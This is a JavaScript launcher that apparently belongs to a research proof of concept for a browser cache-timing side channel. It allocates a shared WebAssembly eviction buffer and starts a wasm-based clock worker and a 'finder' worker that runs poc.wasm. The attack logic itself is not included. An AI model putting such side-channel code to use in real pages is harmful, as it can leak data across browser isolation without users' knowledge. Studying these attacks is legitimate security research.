async function start(config) {
	const BM = 128*1024*1024; // Eviction buffer
	const WP = 64*1024; // A WebAssembly page has a constant size of 64KB
	const SZ = BM/WP; // 128 hardcoded value in wasm

	// Shared memory
	const memory = new WebAssembly.Memory({initial: SZ, maximum: SZ, shared: true});

	// Clock thread
	const resp = await fetch('/clock.wasm');
	const bin = await resp.arrayBuffer();
	const module = new WebAssembly.Module(bin);
	const clock = new Worker('/wasmWorker.js');
	clock.postMessage({"module": module, "memory": memory});

	// Finder thread
	const resp2 = await fetch('/poc.wasm');
	const bin2 = await resp2.arrayBuffer();
	const module2 = new WebAssembly.Module(bin2);
	const finder = new Worker('/finder.js');
	finder.onmessage = function handle(evt) {
		let msg = evt.data;
		switch (msg.type) {
			case 'log':
				log (...msg.str);
				msg.str.map(e => %DebugPrint(e)); // used for verification
				break;
			case 'eof':
				clock.terminate();
				finder.terminate();
			default:
		}
	};
	finder.postMessage({"module": module2, "memory": memory, "conf": config});
	return false;
}
